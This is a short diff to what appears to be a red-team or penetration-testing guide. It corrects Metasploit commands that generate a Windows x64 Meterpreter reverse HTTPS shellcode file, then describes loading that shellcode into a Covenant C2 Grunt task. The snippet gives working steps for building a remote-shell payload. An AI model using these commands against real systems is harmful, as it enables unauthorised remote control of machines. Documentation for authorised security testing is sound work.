@@ -100,7 +100,7 @@ setg exitonsession false
 run -j
 
 # Generate payload
-payload windows/x64/meterpreter/reverse_https
-generate -f raw > /tmp/payload.bin
+use payload windows/x64/meterpreter/reverse_https
+generate -f raw -o /tmp/sc.bin
 ```
 - Go to covenant, select grun --> task --> Shellcode and choose the file
